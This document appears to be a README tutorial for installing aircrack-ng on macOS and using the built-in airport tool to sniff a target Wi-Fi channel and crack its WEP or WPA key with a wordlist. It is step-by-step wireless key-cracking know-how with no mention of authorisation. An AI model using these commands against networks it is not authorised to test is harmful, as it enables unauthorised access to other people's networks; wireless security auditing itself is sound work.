# install-Aircrack-ng

1. Install HomeBrew at https://brew.sh by terminal. Paste that at a Terminal prompt.

/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"

2. Install the aircrack-ng and create necessary links:

  With the homebrew installed, use this command to install aircrack-ng:

brew install aircrack-ng

  Link the folder from Homebrew "/usr/local/Cellar/" to the "/usr/local/bin/" in order to use the program directly on terminal. The number 1.3 can be replaced to the version you install. 

sudo ln -s /usr/local/Cellar/aircrack-ng/1.3/bin/aircrack-ng /usr/local/bin/aircrack-ng

  Other tool that will be necessary is the airport. So we will create a other link to use directly on terminal. Airport is already inside Mac OS. We use Airport to scan the wifis, disconnect to wifis, turn on mornitor mode and sniffing.

sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport

3. Scanning wifis and disconnect to network:

  While we turn the wifi card to the monitor mode, we can not use the scanning function normally. The purpose of airport is scanning the wifis nearby and show information about that network, such as: SSID, BSSID, channel, RSSI...
Use the following command to check:

airport -s

  Now in order to turn wifi card to mornitor mode, we have to disconnect with any network is connecting. You can do it by manual go to Network Preferences then unselect on Automatically join this network. Do this until it does not connect to any network. Or you just type the following command:

airport -z

  To check it working or not, by simply see the wifi simple on the menu bar on the top. Or type:

ifconfig

  and check the line status: inactive

4. Sniff the traffic on channel

  Sniff the channel selected.

airport <interface> sniff <channel>
  
  <interface> is the name of the wifi card. Mine is "en0". Get this from 
ifconfig
  <channel> is the channel of the wifi network target. Get this from
airport -s
    
  The sniffing action create a file airportSniff*.cap. You can see it at:

ls /tmp/airportSniff*.cap

  The longer the sniffing the better data we have.

Then we will pass this file to aircrack-ng

5. Using Aircrack-ng

aircrack-ng -1 -a 1 -b <BSSID> <cap_file> -w <wordlist>

      -1            : run only 1 try to crack key with PTW  
      -a <amode>    : force attack mode (1/WEP, 2/WPA-PSK)
      -b <bssid>    : target selection: access point's MAC
      <cap_file>    : the sniffing file we have from part 4 airportSniff*.cap
      -w <wordlist> : path to wordlist(s) filename(s). This optional but a good wordlist have greater chance to succeed 

6. Turn off mornitor mode

  Using the ps program displays the currently-running processes

ps -ax | grep -a airport.*sniff

find the airport <interface> sniff <channel> line and get the four number on the left
  
sudo kill -9 <the four number>






